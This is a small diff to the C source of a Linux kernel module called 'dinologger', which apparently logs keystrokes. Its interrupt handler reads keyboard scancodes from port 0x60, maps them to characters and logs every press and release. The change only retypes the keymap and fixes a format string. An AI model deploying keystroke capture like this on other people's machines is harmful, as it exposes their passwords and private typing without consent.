@@ -1,6 +1,6 @@
 #include "dinologger.h"
 
-unsigned char kbus[256] = {US_KBMAP};
+unsigned char *kbus[256] = {US_KBMAP};
 
 ssize_t device_read(struct file *, char *, size_t, loff_t *);
 
@@ -53,7 +53,7 @@ ssize_t device_read(struct file *filep, char *user_buffer, size_t len, loff_t *o
 static irqreturn_t irq_handler(int irq, void *dev_id) {
 	int scancode = inb(0x60);
 	int release = scancode & RELEASE;
-	LOGF("character: %c | scancode: %d | mode: %s", kbus[scancode], scancode, release ? "RELEASE" : "PRESS");
+	LOGF("character: %s | scancode: %d | mode: %s", kbus[scancode], scancode, release ? "RELEASE" : "PRESS");
 	return IRQ_NONE;
 }
 
